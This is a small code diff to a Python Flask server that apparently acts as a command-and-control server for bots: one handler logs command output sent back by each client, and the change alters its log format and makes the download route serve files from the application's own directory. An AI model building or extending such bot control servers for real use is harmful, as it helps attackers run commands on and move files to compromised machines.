@@ -66,7 +66,7 @@ def answer():
     """ called by bot when responding to command """
     clientId = request.form['id']
     cmdOutput = request.form['cmdOutput']
-    logging.info("   [-] %s: %s " % (clientId,cmdOutput))
+    logging.info("   [-] From %s received:\n %s " % (clientId,cmdOutput))
     return make_response("OK")
 
 
@@ -91,7 +91,7 @@ def upload():
 @secure_http_response
 def download(filename):
     
-    uploads = os.path.join(os.path.dirname(getRunningApp()) , webapp.config['UPLOAD_FOLDER']) #@UndefinedVariable
+    uploads = os.path.dirname(getRunningApp()) 
     logging.info("   [-] Sending file: %s" % (os.path.join(uploads,filename)))
     return send_from_directory(directory=uploads, filename=filename)
 
